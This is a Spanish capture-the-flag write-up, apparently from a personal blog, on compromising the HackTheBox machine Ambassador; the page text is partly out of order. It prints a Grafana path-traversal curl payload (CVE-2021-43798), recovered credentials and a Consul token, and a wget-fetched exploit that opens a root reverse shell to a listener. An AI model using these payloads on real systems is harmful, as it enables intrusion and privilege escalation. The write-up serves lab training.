2|1|1|mysql|mysql.yaml|proxy||dontStandSoCloseToMe63221!|grafana|grafana|0|||0|{}|2022-09-01 22:43:03|2023-01-20 21:54:47|0|{}|1|uKewFgM4z sqlite&gt; Ganamos acceso Donde el parámetro -h corresponde al host -u al user -p a la contraseña Ahora nos podemos conectar a MySQL debido a que conocemos el user y su contraseña. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 ❯ mysql -h10.10.11.183 -ugrafana -pdontStandSoCloseToMe63221! Welcome to the MariaDB monitor. Commands end with ; or \\g. Your MySQL connection id is 47 Server version: 8.0.30-0ubuntu0.20.04.2 (Ubuntu) Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others. Type &#39;help;&#39; or &#39;\\h&#39; for help. Type &#39;\\c&#39; to clear the current input statement. MySQL [(none)]&gt; show databases; +--------------------+ | Database | +--------------------+ | grafana | | information_schema | | mysql | | performance_schema | | sys | | whackywidget | +--------------------+ 6 rows in set (0,172 sec) MySQL [(none)]&gt; use whackywidget; Reading table information for completion of table and column names You can turn off this feature to get a quicker startup with -A Database changed MySQL [whackywidget]&gt; show tables; +------------------------+ | Tables_in_whackywidget | +------------------------+ | users | +------------------------+ 1 row in set (0,396 sec) MySQL [whackywidget]&gt; SELECT * FROM users; +-----------+------------------------------------------+ | user | pass | +-----------+------------------------------------------+ | developer | YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg== | +-----------+------------------------------------------+ 1 row in set (0,375 sec) MySQL [whackywidget]&gt; Vemos una contraseña, esta se encuentra cifrada en Base64, podemos decifrarla de la siguiente manera. 1 2 echo &quot;YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg==&quot; | base64 -d;echo anEnglishManInNewYork027468 Con esas credenciales podemos conectarnos por SSH. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 ❯ ssh developer@10.10.11.183 The authenticity of host &#39;10.10.11.183 (10.10.11.183)&#39; can&#39;t be established. ECDSA key fingerprint is SHA256:+BgUV7q/7f6W3/1eQWhIKW2f8xTcBh3IM0VwbIAp2A8. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added &#39;10.10.11.183&#39; (ECDSA) to the list of known hosts. developer@10.10.11.183&#39;s password: anEnglishManInNewYork027468 Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-126-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Sat 21 Jan 2023 05:10:23 AM UTC System load: 0.0 Processes: 229 Usage of /: 84.4% of 5.07GB Users logged in: 0 Memory usage: 49% IPv4 address for eth0: 10.10.11.183 Swap usage: 0% 0 updates can be applied immediately. The list of available updates is more than a week old. To check for new updates run: sudo apt update Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings Last login: Sat Jan 21 00:27:29 2023 from 10.10.14.105 developer@ambassador:~$ export TERM=xterm developer@ambassador:~$ Podemos leer la primara flag. 1 2 3 developer@ambassador:~$ cat user.txt 565**************************1b5 developer@ambassador:~$ Enumeración del sistema En la carpeta home buscamos por carpetas/archivos ocultos y encontramos un archivo de configuración de github. 1 2 3 4 developer@ambassador:~$ ls -a . .. .bash_history .bash_logout .bashrc .cache .gitconfig .gnupg .lesshst .local .profile .ssh snap user.txt developer@ambassador:~$ Si lo leemos nos dice la ruta donde se encuentra. 1 2 3 4 5 6 7 developer@ambassador:~$ cat .gitconfig [user] name = Developer email = developer@ambassador.local [safe] directory = /opt/my-app developer@ambassador:~$ Si nos situamos en la carpeta /opt podemos ver el proyecto github. 1 2 3 developer@ambassador:/opt/my-app$ ls -a . .. .git .gitignore env whackywidget developer@ambassador:/opt/my-app$ Si hacemos un git -log podemos ver los últimos commits que se aplicaron 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 developer@ambassador:/opt/my-app$ git log commit 33a53ef9a207976d5ceceddc41a199558843bf3c (HEAD -&gt; main) Author: Developer &lt;developer@ambassador.local&gt; Date: Sun Mar 13 23:47:36 2022 +0000 tidy config script commit c982db8eff6f10f8f3a7d802f79f2705e7a21b55 Author: Developer &lt;developer@ambassador.local&gt; Date: Sun Mar 13 23:44:45 2022 +0000 config script commit 8dce6570187fd1dcfb127f51f147cd1ca8dc01c6 Author: Developer &lt;developer@ambassador.local&gt; Date: Sun Mar 13 22:47:01 2022 +0000 created project with django CLI commit 4b8597b167b2fbf8ec35f992224e612bf28d9e51 Author: Developer &lt;developer@ambassador.local&gt; Date: Sun Mar 13 22:44:11 2022 +0000 .gitignore developer@ambassador:/opt/my-app$ Ahora haciendo un git show se nos mostrará información acerca de ese commit. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 developer@ambassador:/opt/my-app$ git show commit 33a53ef9a207976d5ceceddc41a199558843bf3c (HEAD -&gt; main) Author: Developer &lt;developer@ambassador.local&gt; Date: Sun Mar 13 23:47:36 2022 +0000 tidy config script diff --git a/whackywidget/put-config-in-consul.sh b/whackywidget/put-config-in-consul.sh index 35c08f6..fc51ec0 100755 --- a/whackywidget/put-config-in-consul.sh +++ b/whackywidget/put-config-in-consul.sh @@ -1,4 +1,4 @@ # We use Consul for application config in production, this script will help set the correct values for the app -# Export MYSQL_PASSWORD before running +# Export MYSQL_PASSWORD and CONSUL_HTTP_TOKEN before running -consul kv put --token bb03b43b-1d81-d62b-24b5-39540ee469b5 whackywidget/db/mysql_pw $MYSQL_PASSWORD +consul kv put whackywidget/db/mysql_pw $MYSQL_PASSWORD developer@ambassador:/opt/my-app$ Ahora con una busqueda en Google encontramos una vía potencial de escalar nuestros privilegios. Escalada de privilegios Usando el exploit de GatoGamer podemos elevar nuestros privilegios, nos descargamos el repositorio de GitHub ** , nos montamos un servidor **HTTP con Python 1 python -m http.server 80 En la máquina víctima lo descargamos, y lo ejecutamos, debemos estar en la carpeta personal para poder descargarlo. 1 2 3 4 5 6 7 8 9 10 11 12 13 developer@ambassador:~$ wget http://10.10.14.61/exploit.py --2023-01-21 05:40:22-- http://10.10.14.61/exploit.py Connecting to 10.10.14.61:80... connected. HTTP request sent, awaiting response... 200 OK Length: 1409 (1.4K) [text/x-python] Saving to: ‘exploit.py.1’ exploit.py.1 100%[=================================================================================================&gt;] 1.38K --.-KB/s in 0s 2023-01-21 05:40:22 (95.1 MB/s) - ‘exploit.py.1’ saved [1409/1409] developer@ambassador:~$ En la máquina víctima ejecutamos lo siguiente. Nota: Recuerda cambiar tu IP de HTB En nuestra máquina host nos ponemos en escucha 1 developer@ambassador:~$ python3 exploit.py --lhost 10.10.14.61 --lport 123 --token bb03b43b-1d81-d62b-24b5-39540ee469b5 1 2 ❯ nc -nlvp 123 listening on [any] 123 ... Al ejecutarlo nos debe llegar la shell como root 1 2 3 4 5 6 ❯ nc -nlvp 123 listening on [any] 123 ... connect to [10.10.14.61] from (UNKNOWN) [10.10.11.183] 58732 bash: cannot set terminal process group (3731): Inappropriate ioctl for device bash: no job control in this shell root@ambassador:/# Ahora podemos vizualizar la flag como root 1 2 3 4 5 root@ambassador:~# ls cleanup.sh root.txt snap root@ambassador:~# cat root.txt 5a4**************************4b1 root@ambassador:~#","headline":"Ambassador WriteUp","image":{"alt":"Ambassador WriteUp","url":"http://localhost:4000/assets/img/commons/ambassador-writeup/Ambassador.png","@type":"imageObject"},"mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/ambassador-writeup/"},"url":"http://localhost:4000/posts/ambassador-writeup/"}</script>
<!-- End Jekyll SEO tag -->

  

  <title>Ambassador WriteUp | H4ckerLite | Blog
  </title>

  <!--
  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
  Generated by: https://realfavicongenerator.net/
-->



<link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png">
<link rel="manifest" href="/assets/img/favicons/site.webmanifest">
<link rel="shortcut icon" href="/assets/img/favicons/favicon.ico">
<meta name="apple-mobile-web-app-title" content="H4ckerLite | Blog">
<meta name="application-name" content="H4ckerLite | Blog">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml">
<meta name="theme-color" content="#ffffff">


  

    
      <link rel="preconnect" href="https://fonts.googleapis.com" >
      <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
    
      <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
      <link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin>
    
      <link rel="preconnect" href="https://fonts.googleapis.com" >
      <link rel="dns-prefetch" href="https://fonts.googleapis.com" >
    
      <link rel="preconnect" href="https://cdn.jsdelivr.net" >
      <link rel="dns-prefetch" href="https://cdn.jsdelivr.net" >
    

    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap">

  

  <!-- GA -->
  

  <!-- Bootstrap -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css">

  <!-- Font Awesome -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css">

  <link rel="stylesheet" href="/assets/css/style.css">

  
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css">
  

  
    <!-- Manific Popup -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css">
  

  <!-- JavaScript -->

  <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>

  
    <!--
  Switch the mode between dark and light.
-->

<script type="text/javascript">
  class ModeToggle {
    static get MODE_KEY() { return "mode"; }
    static get MODE_ATTR() { return "data-mode"; }
    static get DARK_MODE() { return "dark"; }
    static get LIGHT_MODE() { return "light"; }
    static get ID() { return "mode-toggle"; }

    constructor() {
      if (this.hasMode) {
        if (this.isDarkMode) {
          if (!this.isSysDarkPrefer) {
            this.setDark();
          }
        } else {
          if (this.isSysDarkPrefer) {
            this.setLight();
          }
        }
      }

      let self = this;

      /* always follow the system prefers */
      this.sysDarkPrefers.addEventListener("change", () => {
        if (self.hasMode) {
          if (self.isDarkMode) {
            if (!self.isSysDarkPrefer) {
              self.setDark();
            }

          } else {
            if (self.isSysDarkPrefer) {
              self.setLight();
            }
          }

          self.clearMode();
        }

        self.notify();

      });

    } /* constructor() */

    get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); }

    get isSysDarkPrefer() { return this.sysDarkPrefers.matches; }

    get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; }

    get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; }

    get hasMode() { return this.mode != null; }

    get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); }

    /* get the current mode on screen */
    get modeStatus() {
      if (this.isDarkMode
        || (!this.hasMode && this.isSysDarkPrefer)) {
        return ModeToggle.DARK_MODE;
      } else {
        return ModeToggle.LIGHT_MODE;
      }
    }

    setDark() {
      $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE);
      sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE);
    }

    setLight() {
      $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE);
      sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE);
    }

    clearMode() {
      $('html').removeAttr(ModeToggle.MODE_ATTR);
      sessionStorage.removeItem(ModeToggle.MODE_KEY);
    }

    /* Notify another plugins that the theme mode has changed */
    notify() {
      window.postMessage({
        direction: ModeToggle.ID,
        message: this.modeStatus
      }, "*");
    }

  } /* ModeToggle */

  const toggle = new ModeToggle();

  function flipMode() {
    if (toggle.hasMode) {
      if (toggle.isSysDarkPrefer) {
        if (toggle.isLightMode) {
          toggle.clearMode();
        } else {
          toggle.setLight();
        }

      } else {
        if (toggle.isDarkMode) {
          toggle.clearMode();
        } else {
          toggle.setDark();
        }
      }

    } else {
      if (toggle.isSysDarkPrefer) {
        toggle.setLight();
      } else {
        toggle.setDark();
      }
    }

    toggle.notify();

  } /* flipMode() */

</script>

  
</head>


  <body data-spy="scroll" data-target="#toc" data-topbar-visible="true">

    <!--
  The Side Bar
-->

<div id="sidebar" class="d-flex flex-column align-items-end">
  <div class="profile-wrapper text-center">
    <div id="avatar">
      <a href="/" class="mx-auto">
        
          
          <img src="/assets/img/favicons/pito.ico" alt="avatar" onerror="this.style.display='none'">
        
      </a>
    </div>

    <div class="site-title mt-3">
      <a href="/">H4ckerLite | Blog</a>
    </div>
    <div class="site-subtitle font-italic">WriteUps, Pentesting</div>

  </div><!-- .profile-wrapper -->

  <ul class="w-100">

    <!-- home -->
    <li class="nav-item">
      <a href="/" class="nav-link">
        <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i>
        <span>INICIO</span>
      </a>
    </li>
    <!-- the real tabs -->
    
    <li class="nav-item">
      <a href="/categories/" class="nav-link">
        <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>CATEGORÍAS</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/tags/" class="nav-link">
        <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>ETIQUETAS</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/about/" class="nav-link">
        <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>ACERCA DE</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/archives/" class="nav-link">
        <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>ARCHIVO</span>
      </a>
    </li> <!-- .nav-item -->
    

  </ul> <!-- ul.nav.flex-column -->

  <div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center">

    
      <button class="mode-toggle btn" aria-label="Switch Mode">
        <i class="fas fa-adjust"></i>
      </button>

      
        <span class="icon-border"></span>
      
    

    
      

      
      <a href="https://github.com/H4ckerLite" aria-label="github"
        target="_blank" rel="noopener">
        <i class="fab fa-github"></i>
      </a>
      

    
      

      
      <a href="https://twitter.com/mortzelo" aria-label="twitter"
        target="_blank" rel="noopener">
        <i class="fab fa-twitter"></i>
      </a>
      

    
      

      
      <a href="https://app.hackthebox.com/profile/824495" aria-label="hackthebox"
        target="_blank" rel="noopener">
        <i class="fas fa-cube"></i>
      </a>
      

    
      

      
      <a href="/feed.xml" aria-label="rss"
        >
        <i class="fas fa-rss"></i>
      </a>
      

    

  </div> <!-- .sidebar-bottom -->

</div><!-- #sidebar -->


    <!--
  The Top Bar
-->

<div id="topbar-wrapper">
  <div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4">
    <span id="breadcrumb">

    

    

      

        
          <span>
            <a href="/">
              Inicio
            </a>
          </span>

        

      

        

      

        

          
            <span>Ambassador WriteUp</span>
          

        

      

    

    </span><!-- endof #breadcrumb -->

    <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i>

    <div id="topbar-title">
      Entrada
    </div>

    <i id="search-trigger" class="fas fa-search fa-fw"></i>
    <span id="search-wrapper" class="align-items-center">
      <i class="fas fa-search fa-fw"></i>
      <input class="form-control" id="search-input" type="search"
        aria-label="search" autocomplete="off" placeholder="Buscar...">
    </span>
    <span id="search-cancel" >Cancelar</span>
  </div>

</div>


    <div id="main-wrapper" class="d-flex justify-content-center">
      <div id="main" class="container pl-xl-4 pr-xl-4">

        









<div class="row">

  <!-- core -->
  <div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4 pb-5">
    <div class="post pl-1 pr-1 pl-md-2 pr-md-2">

    

    
      
      
        <!--
  Refactor the HTML structure.
-->



<!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
-->



<!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
-->



<!-- Add attribute 'hide-bullet' to the checkbox list -->



<!-- images -->




  
  

  
    
      
      
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    
      
      
        
      
      

      
      

      

      
    
      
      
        

    
      

        <!-- Add CDN URL -->
        

        <!-- Add image path -->
        

        
        

      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    
      
      
        
      
      

      
      

      

      
    

    
      

        <!-- Add CDN URL -->
        

        <!-- Add image path -->
        

        
        

      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    
      
      

      
      

      

      
    

    
      

        <!-- Add CDN URL -->
        

        <!-- Add image path -->
        

        
        

      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  
    

    
    
    

    
    

    
    
    

    
      
      

      
      

      

      
    
      
      

      
      

      

      
    
      
      

      
      

      

      
    

    
      

        <!-- Add CDN URL -->
        

        <!-- Add image path -->
        

        
        

      

      <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

      

    

    <!-- Add SVG placehoder to prevent layout reflow -->

    

    <!-- Bypass the HTML-proofer test -->
    

    

  

  



<!-- Add header for code snippets -->



<!-- Create heading anchors -->





  
  

  
    
    

    
      
        
        
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    
      

      
      

      
      
      

      

    

    

  

  
  

  

  
  

  

  
  

  




<!-- Wrap prompt element of blockquote with the <div> tag -->







<!-- return -->





<h1 data-toc-skip>Ambassador WriteUp</h1>

<div class="post-meta text-muted">
    <!-- published date -->
    <span>
      Publicado
      <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->





<em class=""
    data-ts="1673884800"
    data-df="YYYY-MM-DD"
    data-toggle="tooltip" data-placement="bottom">
  2023-01-16
</em>

    </span>

    <!-- lastmod date -->
    
    <span>
      Actualizado
      <!--
  Date format snippet
  See: ${JS_ROOT}/utils/locale-dateime.js
-->





<em class=""
    data-ts="1675541574"
    data-df="YYYY-MM-DD"
    data-toggle="tooltip" data-placement="bottom">
  2023-02-04
</em>

    </span>
    

  
    

    <div class="mt-3 mb-3">
      <img data-src="../../assets/img/commons/ambassador-writeup/Ambassador.png" class="preview-img bg"
        alt="Ambassador WriteUp"

      

       data-proofer-ignore>

      
        <figcaption class="text-center pt-2 pb-2">Ambassador WriteUp</figcaption>
      

    </div>
  

  <div class="d-flex justify-content-between">
    <!-- author -->
    <span>
      
      

      

      Por

      <em>
        
        H4ckerLite
        
      </em>
    </span>

    <div>
      <!-- page views -->
      

      <!-- read time -->
      <!--
  Calculate the post's reading time, and display the word count in tooltip
 -->



<!-- words per minute  -->










<!-- return element -->
<span class="readtime" data-toggle="tooltip" data-placement="bottom"
  title="1684 palabras">
  <em>9 min</em> de lectura</span>

    </div>

  </div> <!-- .d-flex -->

</div> <!-- .post-meta -->

<div class="post-content">
  <p>Les explicare como comprometer la máquina <a href="https://app.hackthebox.com/machines/499">Ambassador</a> de HackTheBox, Nos enfrentaremos a una version de Grafana la cual cuenta con un
a vulnerabilidad de tipo <code class="language-plaintext highlighter-rouge">Directory Transversal</code> y <code class="language-plaintext highlighter-rouge">Arbitrary File Read</code>. Para ganar acceso al sistema nos aprovecharemos de aquella vulneravilidad de grafana que nos aprovecharemos de en exploit de <code class="language-plaintext highlighter-rouge">Consul</code> con un token que nos lanzará la s
hell como root.</p>

<h2 id="escaneo-nmap"><span class="mr-2">Escaneo NMAP</span><a href="#escaneo-nmap" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<p>Empezamos enumerando con <code class="language-plaintext highlighter-rouge">NMAP</code>, con ello encontaremos los puertos abiertos y los servicios que se exponen.</p>
<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre></td><td class="rouge-code"><pre>❯ nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">-sS</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-vvv</span> <span class="nt">-n</span> <span class="nt">-Pn</span> 10.10.11.183 <span class="nt">-oG</span> allPorts
Host discovery disabled <span class="o">(</span><span class="nt">-Pn</span><span class="o">)</span><span class="nb">.</span> All addresses will be marked <span class="s1">'up'</span> and scan <span class="nb">times </span>may be slower.
Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2023-01-21 00:03 <span class="nt">-04</span>
Initiating SYN Stealth Scan at 00:03
Scanning 10.10.11.183 <span class="o">[</span>65535 ports]
Discovered open port 80/tcp on 10.10.11.183
Discovered open port 3306/tcp on 10.10.11.183
Discovered open port 22/tcp on 10.10.11.183
Discovered open port 3000/tcp on 10.10.11.183
Completed SYN Stealth Scan at 00:03, 17.01s elapsed <span class="o">(</span>65535 total ports<span class="o">)</span>
Nmap scan report <span class="k">for </span>10.10.11.183
Host is up, received user-set <span class="o">(</span>0.32s latency<span class="o">)</span><span class="nb">.</span>
Scanned at 2023-01-21 00:03:39 <span class="nt">-04</span> <span class="k">for </span>17s
Not shown: 61030 closed tcp ports <span class="o">(</span>reset<span class="o">)</span>, 4501 filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
Some closed ports may be reported as filtered due to <span class="nt">--defeat-rst-ratelimit</span>
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 63
80/tcp   open  http    syn-ack ttl 63
3000/tcp open  ppp     syn-ack ttl 63
3306/tcp open  mysql   syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>17.22 seconds
           Raw packets sent: 82990 <span class="o">(</span>3.652MB<span class="o">)</span> | Rcvd: 66979 <span class="o">(</span>2.679MB<span class="o">)</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Puerto <strong>22</strong> su servicio por defecto es <strong>SSH</strong>, <strong>80</strong> este puerto en su configuración por defecto corre el servicio <strong>HTTP</strong>, MySQL corre en el puerto <strong>3306</strong> y el puerto 
3000 fue asignado por el <strong>administrador</strong></p>
<h2 id="enumeración"><span class="mr-2">Enumeración</span><a href="#enumeración" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
<p>Podemos realizar <strong>FUZZING</strong> para ver si encontramos ninggun directorio, pero esto resultaría inutíl ya que no encontraremos nada, en su lugar podemos usar el puerto que encon
tramos y tratar de acceder a él.
Viendo la web nos encontramos con esto:</p>

<p><img data-src="/assets/img/commons/ambassador-writeup/grafana.png" alt="Grafana Login" class="center-image" data-proofer-ignore>
<em>Grafana Login</em></p>

<p>Viendo en la parte inferior nos da información acerca de la versión, usando <strong>searchsploit</strong> nos damos cuenta de q
ue cuenta con estas vulnerabilidades <strong><em>Directory Traversal</em></strong> and <strong><em>Arbitrary File Read</em></strong></p>

<p><img data-src="/assets/img/commons/ambassador-writeup/sea.png" alt="Searchsploit" class="center-image" data-proofer-ignore>
<em>Searchsploit</em></p>

<p>Podemos copiar el script de Python en nuestra carpeta de trabajo e intentamos leer el <code class="language-plaintext highlighter-rouge">/etc/passwd</code></p>
<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre>❯ searchsploit <span class="nt">-m</span> multiple/webapps/50581.py
  Exploit: Grafana 8.3.0 - Directory Traversal and Arbitrary File Read
      URL: https://www.exploit-db.com/exploits/50581
     Path: /snap/searchsploit/62/opt/exploitdb/exploits/multiple/webapps/50581.py
    Codes: CVE-2021-43798
 Verified: False
File Type: Python script, ASCII text executable
Copied to: /home/h4ckerlite/Desktop/h4ckerlite/HTB/Máquinas/Ambassador/nmap/50581.py
</pre></td></tr></tbody></table></code></div></div>
<p>Lo ejecutamos…</p>

<p><img data-src="/assets/img/commons/ambassador-writeup/etc.png" alt="Searchsploit" class="center-image" data-proofer-ignore>
<em>Searchsploit</em></p>

<p>Buscando en internet acerca de este <strong>CVE</strong> nos encontramos con este <a href="https://vk9-sec.com/grafana-8-3-0-directory-traversal-and-arbitrary-file-read-cve-2021-43798/">blog</a>, nos
 enseñan a explotarlo de forma manual.</p>
<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre>❯ curl <span class="nt">--path-as-is</span> http://10.10.11.183:3000/public/plugins/alertlist/../../../../../../../../etc/passwd | <span class="nb">grep </span>sh<span class="err">$</span>

root:x:0:0:root:/root:/bin/bash
developer:x:1000:1000:developer:/home/developer:/bin/bash
</pre></td></tr></tbody></table></code></div></div>

<p>Si seguimos leyendo podemos ver que nos podemos descargar la base de datos</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre> curl <span class="nt">--path-as-is</span> http://10.10.11.183:3000/public/plugins/alertlist/../../../../../../../../var/lib/grafana/grafana.db <span class="nt">-o</span> grafana.db
</pre></td></tr></tbody></table></code></div></div>
<p>Ahora procedemos a leer la base de datos, para ello debes tener instalado <strong>sqlite3</strong> para verlo desde consola, ya que lo considero mas fácil.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>  <span class="nb">sudo </span>apt <span class="nb">install </span>sqlite3
</pre></td></tr></tbody></table></code></div></div>
<p>Sigueindo las instrucciones del blog leemos la base de datos.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre> sqlite3 grafana.bd
</pre></td></tr></tbody></table></code></div></div>

<p>Una vez detro de la base de datos, procedemos a leer las tablas</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
</pre></td><td class="rouge-code"><pre> ❯ sqlite3 grafana.db
SQLite version 3.34.1 2021-01-20 14:10:07
Enter <span class="s2">".help"</span> <span class="k">for </span>usage hints.
sqlite&gt; .tables
alert                       login_attempt             
alert_configuration         migration_log             
alert_instance              ngalert_configuration     
alert_notification          org                       
alert_notification_state    org_user                  
alert_rule                  playlist                  
alert_rule_tag              playlist_item             
alert_rule_version          plugin_setting            
annotation                  preferences               
annotation_tag              quota                     
api_key                     server_lock               
cache_data                  session                   
dashboard                   short_url                 
dashboard_acl               star                      
dashboard_provisioning      tag                       
dashboard_snapshot          team                      
dashboard_tag               team_member               
dashboard_version           temp_user                 
data_source                 test_data                 
kv_store                    user                      
library_element             user_auth                 
library_element_connection  user_auth_token           
sqlite&gt; 

</pre></td></tr></tbody></table></code></div></div>

<p>Usando una query de SQL, leeremos las columnas de la tabla <strong>data_source</strong>.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
